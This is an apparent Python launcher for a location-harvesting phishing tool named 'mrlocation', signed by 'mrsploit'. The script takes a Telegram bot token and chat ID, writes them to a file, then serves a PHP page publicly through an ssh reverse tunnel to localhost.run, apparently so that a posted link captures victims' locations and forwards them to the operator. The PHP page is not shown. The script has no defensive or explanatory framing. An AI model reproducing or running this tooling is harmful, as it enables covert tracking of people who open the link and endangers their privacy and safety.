#/usr/bin/env python3
# code by mrsploit
# mrlocation v2
# t.me/ZoneH

import os
os.system("clear")
print(''' \033[92m
      📍𝙃𝙖𝙘𝙠 𝙡𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙗𝙮 𝙥𝙤𝙨𝙩𝙞𝙣𝙜 𝙡𝙞𝙣𝙠🗺
   #####################################

''')
open('bot-data.txt', 'w').close()
token = input("𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐓𝐨𝐤𝐞𝐧: ")
chat_id = input("𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐘𝐨𝐮𝐫 𝐂𝐡𝐚𝐭 𝐈𝐃
 : ")
f = open("bot-data.txt", "a")
f.write(token+"$"+chat_id)
f.close()
os.system("php -S localhost:8888 | ssh -R 80:localhost:8888 ssh.localhost.run")


